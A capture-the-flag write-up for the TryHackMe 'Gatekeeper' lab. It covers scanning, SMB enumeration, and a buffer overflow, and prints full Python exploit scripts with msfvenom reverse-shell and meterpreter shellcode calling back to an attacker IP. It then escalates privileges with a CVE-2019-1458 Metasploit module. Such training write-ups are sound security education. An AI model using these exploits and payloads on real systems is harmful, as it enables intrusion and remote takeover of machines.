| [![Gatekeeper](../../_static/images/gatekeeper-room-banner.png)](https://tryhackme.com/room/gatekeeper) |
|:--:|
| [THM Gatekeeper](https://tryhackme.com/room/gatekeeper) |

# THM Gatekeeper

Can you get past the gate and through the fire?

## Requirements

[A small local lab](../prep/README.md).

## Scanning

    nmap -p- -T4 -Pn $MACHINE_IP
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-13 13:46 GMT
    Nmap scan report for ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250)
    Host is up (0.00044s latency).
    Not shown: 65524 closed ports
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    31337/tcp open  Elite
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49160/tcp open  unknown
    49161/tcp open  unknown
    49162/tcp open  unknown
    MAC Address: 02:D1:76:28:34:57 (Unknown)
    
    Nmap done: 1 IP address (1 host up) scanned in 1642.77 seconds

## Enumeration

    sudo nmap -p 135,139,445,3389,31337 -sV -sC -v -Pn -T4 $MACHINE_IP

    Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-13 14:17 GMT
    NSE: Loaded 146 scripts for scanning.
    NSE: Script Pre-scanning.
    Initiating NSE at 14:17
    Completed NSE at 14:17, 0.00s elapsed
    Initiating NSE at 14:17
    Completed NSE at 14:17, 0.00s elapsed
    Initiating ARP Ping Scan at 14:17
    Scanning 10.10.110.250 [1 port]
    Completed ARP Ping Scan at 14:17, 0.22s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 14:17
    Completed Parallel DNS resolution of 1 host. at 14:17, 0.00s elapsed
    Initiating SYN Stealth Scan at 14:17
    Scanning ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250) [5 ports]
    Discovered open port 31337/tcp on 10.10.110.250
    Completed SYN Stealth Scan at 14:17, 1.24s elapsed (5 total ports)
    Initiating Service scan at 14:17
    Scanning 1 service on ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250)
    Completed Service scan at 14:20, 146.16s elapsed (1 service on 1 host)
    NSE: Script scanning 10.10.110.250.
    Initiating NSE at 14:20
    Completed NSE at 14:20, 0.01s elapsed
    Initiating NSE at 14:20
    Completed NSE at 14:20, 1.01s elapsed
    Nmap scan report for ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250)
    Host is up (0.00018s latency).
    
    PORT      STATE    SERVICE       VERSION
    135/tcp   filtered msrpc
    139/tcp   filtered netbios-ssn
    445/tcp   filtered microsoft-ds
    3389/tcp  filtered ms-wbt-server
    31337/tcp open     Elite?
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
    |     Hello
    |   GenericLines: 
    |     Hello 
    |     Hello
    |   GetRequest: 
    |     Hello GET / HTTP/1.0
    |     Hello
    |   HTTPOptions: 
    |     Hello OPTIONS / HTTP/1.0
    |     Hello
    |   Help: 
    |     Hello HELP
    |   Kerberos: 
    |     Hello !!!
    |   LDAPSearchReq: 
    |     Hello 0
    |     Hello
    |   LPDString: 
    |     Hello 
    |     default!!!
    |   RTSPRequest: 
    |     Hello OPTIONS / RTSP/1.0
    |     Hello
    |   SIPOptions: 
    |     Hello OPTIONS sip:nm SIP/2.0
    |     Hello Via: SIP/2.0/TCP nm;branch=foo
    |     Hello From: <sip:nm@nm>;tag=root
    |     Hello To: <sip:nm2@nm2>
    |     Hello Call-ID: 50000
    |     Hello CSeq: 42 OPTIONS
    |     Hello Max-Forwards: 70
    |     Hello Content-Length: 0
    |     Hello Contact: <sip:nm@nm>
    |     Hello Accept: application/sdp
    |     Hello
    |   SSLSessionReq, TLSSessionReq: 
    |_    Hello
    1 service unrecognized despite returning data. ...
    
    NSE: Script Post-scanning.
    Initiating NSE at 14:20
    Completed NSE at 14:20, 0.00s elapsed
    Initiating NSE at 14:20
    Completed NSE at 14:20, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 149.29 seconds
               Raw packets sent: 10 (424B) | Rcvd: 2 (72B)

### Interacting with the service on port 31337

    nc $MACHINE_IP 31337


    Hello !!!
    Hi
    Hello Hi!!!

And with a very long string, gets kicked out.

### SMB

Using `smbclient` to list available shares on the host:

    smbclient -L $MACHINE_IP

    Enter WORKGROUP\root's password: 
    
            Sharename       Type      Comment
            ---------       ----      -------
            ADMIN$          Disk      Remote Admin
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
            Users           Disk      
    SMB1 disabled -- no workgroup available

Using `smbclient` to access the `Users` share anonymously:

    smbclient \\\\$MACHINE_IP\\Users

    Enter WORKGROUP\root's password: 
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                  DR        0  Thu May 14 21:57:08 2020
      ..                                 DR        0  Thu May 14 21:57:08 2020
      Default                           DHR        0  Tue Jul 14 03:07:31 2009
      desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
      Share                               D        0  Thu May 14 21:58:07 2020
                      7863807 blocks of size 4096. 3876715 blocks available

    smb: \> cd Share
    smb: \Share\> ls
      .                                   D        0  Thu May 14 21:58:07 2020
      ..                                  D        0  Thu May 14 21:58:07 2020
      gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020
    
                    7863807 blocks of size 4096. 3876715 blocks available

Getting the `gatekeeper.exe` file:

    smb: \Share\> get gatekeeper.exe
    getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)

Start a web server on the Kali VM in the directory with the files (to download the files to the Windows VM):

    python3 -m http.server

## Exploiting buffer overflow

Get the binary file from the Kali box and follow the [stack-based buffer overflow howto](../prep/overflow1.md) 
for creating BoF scripts, with:

    Offset: 146
    JMP ESP address: 080414C3
    Bad characters: 00, 0a

Generate payload with `msfvenom` (`tun0` IP address of KALI on the THM network):

    # msfvenom -p windows/shell_reverse_tcp LHOST=10.18.22.77 LPORT=4444 -e x86/shikata_ga_nai -f exe -b "\x00\x0a" -f python -v payload
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    x86/shikata_ga_nai chosen with final size 351
    Payload size: 351 bytes
    Final size of python file: 1899 bytes
    payload =  b""
    payload += b"\xb8\xb6\x84\xda\x04\xdb\xdd\xd9\x74\x24\xf4"
    payload += b"\x5d\x29\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04"
    payload += b"\x03\xf3\x8a\x38\xf1\x07\x7a\x3e\xfa\xf7\x7b"
    payload += b"\x5f\x72\x12\x4a\x5f\xe0\x57\xfd\x6f\x62\x35"
    payload += b"\xf2\x04\x26\xad\x81\x69\xef\xc2\x22\xc7\xc9"
    payload += b"\xed\xb3\x74\x29\x6c\x30\x87\x7e\x4e\x09\x48"
    payload += b"\x73\x8f\x4e\xb5\x7e\xdd\x07\xb1\x2d\xf1\x2c"
    payload += b"\x8f\xed\x7a\x7e\x01\x76\x9f\x37\x20\x57\x0e"
    payload += b"\x43\x7b\x77\xb1\x80\xf7\x3e\xa9\xc5\x32\x88"
    payload += b"\x42\x3d\xc8\x0b\x82\x0f\x31\xa7\xeb\xbf\xc0"
    payload += b"\xb9\x2c\x07\x3b\xcc\x44\x7b\xc6\xd7\x93\x01"
    payload += b"\x1c\x5d\x07\xa1\xd7\xc5\xe3\x53\x3b\x93\x60"
    payload += b"\x5f\xf0\xd7\x2e\x7c\x07\x3b\x45\x78\x8c\xba"
    payload += b"\x89\x08\xd6\x98\x0d\x50\x8c\x81\x14\x3c\x63"
    payload += b"\xbd\x46\x9f\xdc\x1b\x0d\x32\x08\x16\x4c\x5b"
    payload += b"\xfd\x1b\x6e\x9b\x69\x2b\x1d\xa9\x36\x87\x89"
    payload += b"\x81\xbf\x01\x4e\xe5\x95\xf6\xc0\x18\x16\x07"
    payload += b"\xc9\xde\x42\x57\x61\xf6\xea\x3c\x71\xf7\x3e"
    payload += b"\x92\x21\x57\x91\x53\x91\x17\x41\x3c\xfb\x97"
    payload += b"\xbe\x5c\x04\x72\xd7\xf7\xff\x15\xd2\x15\xe9"
    payload += b"\xa8\x8a\x1b\x15\x22\x17\x95\xf3\x2e\xb7\xf3"
    payload += b"\xac\xc6\x2e\x5e\x26\x76\xae\x74\x43\xb8\x24"
    payload += b"\x7b\xb4\x77\xcd\xf6\xa6\xe0\x3d\x4d\x94\xa7"
    payload += b"\x42\x7b\xb0\x24\xd0\xe0\x40\x22\xc9\xbe\x17"
    payload += b"\x63\x3f\xb7\xfd\x99\x66\x61\xe3\x63\xfe\x4a"
    payload += b"\xa7\xbf\xc3\x55\x26\x4d\x7f\x72\x38\x8b\x80"
    payload += b"\x3e\x6c\x43\xd7\xe8\xda\x25\x81\x5a\xb4\xff"
    payload += b"\x7e\x35\x50\x79\x4d\x86\x26\x86\x98\x70\xc6"
    payload += b"\x37\x75\xc5\xf9\xf8\x11\xc1\x82\xe4\x81\x2e"
    payload += b"\x59\xad\xb2\x64\xc3\x84\x5a\x21\x96\x94\x06"
    payload += b"\xd2\x4d\xda\x3e\x51\x67\xa3\xc4\x49\x02\xa6"
    payload += b"\x81\xcd\xff\xda\x9a\xbb\xff\x49\x9a\xe9"

Script:

```python
import socket

ip = "MACHINE_IP"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"           # JMP ESP address 080414C3
padding = "\x90"*16
postfix = "\x90\x90\x90\x90"

payload =  b""
payload += b"\xb8\xb6\x84\xda\x04\xdb\xdd\xd9\x74\x24\xf4"
payload += b"\x5d\x29\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04"
payload += b"\x03\xf3\x8a\x38\xf1\x07\x7a\x3e\xfa\xf7\x7b"
payload += b"\x5f\x72\x12\x4a\x5f\xe0\x57\xfd\x6f\x62\x35"
payload += b"\xf2\x04\x26\xad\x81\x69\xef\xc2\x22\xc7\xc9"
payload += b"\xed\xb3\x74\x29\x6c\x30\x87\x7e\x4e\x09\x48"
payload += b"\x73\x8f\x4e\xb5\x7e\xdd\x07\xb1\x2d\xf1\x2c"
payload += b"\x8f\xed\x7a\x7e\x01\x76\x9f\x37\x20\x57\x0e"
payload += b"\x43\x7b\x77\xb1\x80\xf7\x3e\xa9\xc5\x32\x88"
payload += b"\x42\x3d\xc8\x0b\x82\x0f\x31\xa7\xeb\xbf\xc0"
payload += b"\xb9\x2c\x07\x3b\xcc\x44\x7b\xc6\xd7\x93\x01"
payload += b"\x1c\x5d\x07\xa1\xd7\xc5\xe3\x53\x3b\x93\x60"
payload += b"\x5f\xf0\xd7\x2e\x7c\x07\x3b\x45\x78\x8c\xba"
payload += b"\x89\x08\xd6\x98\x0d\x50\x8c\x81\x14\x3c\x63"
payload += b"\xbd\x46\x9f\xdc\x1b\x0d\x32\x08\x16\x4c\x5b"
payload += b"\xfd\x1b\x6e\x9b\x69\x2b\x1d\xa9\x36\x87\x89"
payload += b"\x81\xbf\x01\x4e\xe5\x95\xf6\xc0\x18\x16\x07"
payload += b"\xc9\xde\x42\x57\x61\xf6\xea\x3c\x71\xf7\x3e"
payload += b"\x92\x21\x57\x91\x53\x91\x17\x41\x3c\xfb\x97"
payload += b"\xbe\x5c\x04\x72\xd7\xf7\xff\x15\xd2\x15\xe9"
payload += b"\xa8\x8a\x1b\x15\x22\x17\x95\xf3\x2e\xb7\xf3"
payload += b"\xac\xc6\x2e\x5e\x26\x76\xae\x74\x43\xb8\x24"
payload += b"\x7b\xb4\x77\xcd\xf6\xa6\xe0\x3d\x4d\x94\xa7"
payload += b"\x42\x7b\xb0\x24\xd0\xe0\x40\x22\xc9\xbe\x17"
payload += b"\x63\x3f\xb7\xfd\x99\x66\x61\xe3\x63\xfe\x4a"
payload += b"\xa7\xbf\xc3\x55\x26\x4d\x7f\x72\x38\x8b\x80"
payload += b"\x3e\x6c\x43\xd7\xe8\xda\x25\x81\x5a\xb4\xff"
payload += b"\x7e\x35\x50\x79\x4d\x86\x26\x86\x98\x70\xc6"
payload += b"\x37\x75\xc5\xf9\xf8\x11\xc1\x82\xe4\x81\x2e"
payload += b"\x59\xad\xb2\x64\xc3\x84\x5a\x21\x96\x94\x06"
payload += b"\xd2\x4d\xda\x3e\x51\x67\xa3\xc4\x49\x02\xa6"
payload += b"\x81\xcd\xff\xda\x9a\xbb\xff\x49\x9a\xe9"

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

Start a listener on Kali:

    $ nc -nlvp 4444              
    listening on [any] 4444 ...

Execute exploit:

    $ python3 exploit.py
    Sending evil buffer...
    Done!

Catch it in the listener:

    $ nc -nlvp 4444              
    listening on [any] 4444 ...
    connect to [KALI_VPN_IP] from (UNKNOWN) [MACHINE_IP] 49214
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Users\natbat\Desktop>whoami
    whoami
    gatekeeper\natbat

## User flag

    C:\Users\natbat\Desktop>dir
    
     Directory of C:\Users\natbat\Desktop
    
    04/21/2020  05:00 PM             1,197 Firefox.lnk
    04/20/2020  01:27 AM            13,312 gatekeeper.exe
    04/21/2020  09:53 PM               135 gatekeeperstart.bat
    05/14/2020  09:43 PM               140 user.txt.txt

    C:\Users\natbat\Desktop>type user.txt.txt

## Privilege escalation

Generate meterpreter payload with `msfvenom` (`tun0` IP address of KALI on the THM network):

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.22.77 LPORT=4444 -e x86/shikata_ga_nai -f exe -b "\x00\x0a" -f python -v payload
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai chosen with final size 381
    Payload size: 381 bytes
    Final size of python file: 2064 bytes
    payload =  b""
    payload += b"\xd9\xeb\xd9\x74\x24\xf4\xbb\x8c\x1f\xc5\xa2"
    payload += b"\x58\x29\xc9\xb1\x59\x83\xc0\x04\x31\x58\x15"
    payload += b"\x03\x58\x15\x6e\xea\x39\x4a\xe1\x15\xc2\x8b"
    payload += b"\x9d\x24\x10\x02\xb8\x23\x1f\x47\x72\x27\x4d"
    payload += b"\x64\xf9\x65\x66\x45\x02\x86\x31\xef\xda\x12"
    payload += b"\x4f\xd8\x13\xe5\x1c\x24\x32\x99\x5e\x79\x94"
    payload += b"\xa0\x90\x8c\xd5\xe5\x66\xfa\x3a\xbb\x2f\x8f"
    payload += b"\x96\x2c\x5b\xcd\x2a\x4c\x8b\x59\x12\x36\xae"
    payload += b"\x9e\xe6\x8a\xb1\xce\x8d\x4b\x92\xef\x42\xe0"
    payload += b"\x9a\xf7\x34\x72\xd3\x7c\x88\x4d\x1b\x35\x7b"
    payload += b"\x99\x68\xc7\xad\xd3\xae\x64\x90\xdb\x22\x74"
    payload += b"\xd5\xdc\xdc\x03\x2d\x1f\x60\x14\xf6\x5d\xbe"
    payload += b"\x91\xe8\xc6\x35\x01\xcc\xf7\x9a\xd4\x87\xf4"
    payload += b"\x57\x92\xcf\x18\x69\x77\x64\x24\xe2\x76\xaa"
    payload += b"\xac\xb0\x5c\x6e\xf4\x63\xfc\x37\x50\xc5\x01"
    payload += b"\x27\x3c\xba\xa7\x2c\xaf\xad\xd8\xcd\x2f\xd2"
    payload += b"\x84\x59\xe3\x1f\x37\x99\x6b\x17\x44\xab\x34"
    payload += b"\x83\xc2\x87\xbd\x0d\x14\x9e\xaa\xad\xca\x18"
    payload += b"\xba\x53\xeb\x58\x92\x97\xbf\x08\x8c\x3e\xc0"
    payload += b"\xc3\x4c\xbe\x15\x79\x47\x28\x9c\x6f\x41\xe5"
    payload += b"\xc8\x8d\x6d\xe4\x54\x18\x8b\x56\x35\x4a\x04"
    payload += b"\x17\xe5\x2a\xf4\xff\xef\xa5\x2b\x1f\x10\x6c"
    payload += b"\x44\x8a\xff\xd8\x3c\x23\x99\x41\xb6\xd2\x66"
    payload += b"\x5c\xb2\xd5\xed\x54\x42\x9b\x05\x1d\x50\xcc"
    payload += b"\x71\xdd\xa8\x0d\x14\xdd\xc2\x09\xbe\x8a\x7a"
    payload += b"\x10\xe7\xfc\x24\xeb\xc2\x7f\x22\x13\x93\x49"
    payload += b"\x58\x22\x01\xf5\x36\x4b\xc5\xf5\xc6\x1d\x8f"
    payload += b"\xf5\xae\xf9\xeb\xa6\xcb\x05\x26\xdb\x47\x90"
    payload += b"\xc9\x8d\x34\x33\xa2\x33\x62\x73\x6d\xcc\x41"
    payload += b"\x07\x6a\x32\x17\x20\xd3\x5a\xe7\x70\xe3\x9a"
    payload += b"\x8d\x70\xb3\xf2\x5a\x5e\x3c\x32\xa2\x75\x15"
    payload += b"\x5a\x29\x18\xd7\xfb\x2e\x31\xb9\xa5\x2f\xb6"
    payload += b"\x62\x56\x55\xb7\x95\x97\xaa\xd1\xf1\x98\xaa"
    payload += b"\xdd\x07\xa5\x7c\xe4\x7d\xe8\xbc\x53\x8d\x5f"
    payload += b"\xe0\xf2\x04\x9f\xb6\x05\x0d"
                                                  
Replacing the shellcode in the script:

```python
import socket

ip = "MACHINE_IP"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"           # JMP ESP address 080414C3
padding = "\x90"*16
postfix = "\x90\x90\x90\x90"

payload =  b""
payload += b"\xd9\xeb\xd9\x74\x24\xf4\xbb\x8c\x1f\xc5\xa2"
payload += b"\x58\x29\xc9\xb1\x59\x83\xc0\x04\x31\x58\x15"
payload += b"\x03\x58\x15\x6e\xea\x39\x4a\xe1\x15\xc2\x8b"
payload += b"\x9d\x24\x10\x02\xb8\x23\x1f\x47\x72\x27\x4d"
payload += b"\x64\xf9\x65\x66\x45\x02\x86\x31\xef\xda\x12"
payload += b"\x4f\xd8\x13\xe5\x1c\x24\x32\x99\x5e\x79\x94"
payload += b"\xa0\x90\x8c\xd5\xe5\x66\xfa\x3a\xbb\x2f\x8f"
payload += b"\x96\x2c\x5b\xcd\x2a\x4c\x8b\x59\x12\x36\xae"
payload += b"\x9e\xe6\x8a\xb1\xce\x8d\x4b\x92\xef\x42\xe0"
payload += b"\x9a\xf7\x34\x72\xd3\x7c\x88\x4d\x1b\x35\x7b"
payload += b"\x99\x68\xc7\xad\xd3\xae\x64\x90\xdb\x22\x74"
payload += b"\xd5\xdc\xdc\x03\x2d\x1f\x60\x14\xf6\x5d\xbe"
payload += b"\x91\xe8\xc6\x35\x01\xcc\xf7\x9a\xd4\x87\xf4"
payload += b"\x57\x92\xcf\x18\x69\x77\x64\x24\xe2\x76\xaa"
payload += b"\xac\xb0\x5c\x6e\xf4\x63\xfc\x37\x50\xc5\x01"
payload += b"\x27\x3c\xba\xa7\x2c\xaf\xad\xd8\xcd\x2f\xd2"
payload += b"\x84\x59\xe3\x1f\x37\x99\x6b\x17\x44\xab\x34"
payload += b"\x83\xc2\x87\xbd\x0d\x14\x9e\xaa\xad\xca\x18"
payload += b"\xba\x53\xeb\x58\x92\x97\xbf\x08\x8c\x3e\xc0"
payload += b"\xc3\x4c\xbe\x15\x79\x47\x28\x9c\x6f\x41\xe5"
payload += b"\xc8\x8d\x6d\xe4\x54\x18\x8b\x56\x35\x4a\x04"
payload += b"\x17\xe5\x2a\xf4\xff\xef\xa5\x2b\x1f\x10\x6c"
payload += b"\x44\x8a\xff\xd8\x3c\x23\x99\x41\xb6\xd2\x66"
payload += b"\x5c\xb2\xd5\xed\x54\x42\x9b\x05\x1d\x50\xcc"
payload += b"\x71\xdd\xa8\x0d\x14\xdd\xc2\x09\xbe\x8a\x7a"
payload += b"\x10\xe7\xfc\x24\xeb\xc2\x7f\x22\x13\x93\x49"
payload += b"\x58\x22\x01\xf5\x36\x4b\xc5\xf5\xc6\x1d\x8f"
payload += b"\xf5\xae\xf9\xeb\xa6\xcb\x05\x26\xdb\x47\x90"
payload += b"\xc9\x8d\x34\x33\xa2\x33\x62\x73\x6d\xcc\x41"
payload += b"\x07\x6a\x32\x17\x20\xd3\x5a\xe7\x70\xe3\x9a"
payload += b"\x8d\x70\xb3\xf2\x5a\x5e\x3c\x32\xa2\x75\x15"
payload += b"\x5a\x29\x18\xd7\xfb\x2e\x31\xb9\xa5\x2f\xb6"
payload += b"\x62\x56\x55\xb7\x95\x97\xaa\xd1\xf1\x98\xaa"
payload += b"\xdd\x07\xa5\x7c\xe4\x7d\xe8\xbc\x53\x8d\x5f"
payload += b"\xe0\xf2\x04\x9f\xb6\x05\x0d"

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

Starting msfConsole, selecting the multi handler module, and setting and running the exploit:

    sudo msfconsole -q

    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost tun0
    msf6 exploit(multi/handler) > set lport 4444
    msf6 exploit(multi/handler) > exploit

Executing the script:

    python exploit.py

Backgrounding meterpreter:

    meterpreter > background
    msf6 exploit(multi/handler) > sessions
    msf6 exploit(multi/handler) > use windows/local/cve_2019_1458_wizardopium
    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > show options

Set options:

```text
Module options (exploit/windows/local/cve_2019_1458_wizardopium):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PROCESS  notepad.exe      yes       Name of process to spawn and inject dll into.
   SESSION  2                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.18.22.77      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 x64
```

And exploit:

    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > exploit

## Root flag

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM

    meterpreter > pwd

    meterpreter > cd c:\users\mayor\desktop

    meterpreter > cat root.txt.txt
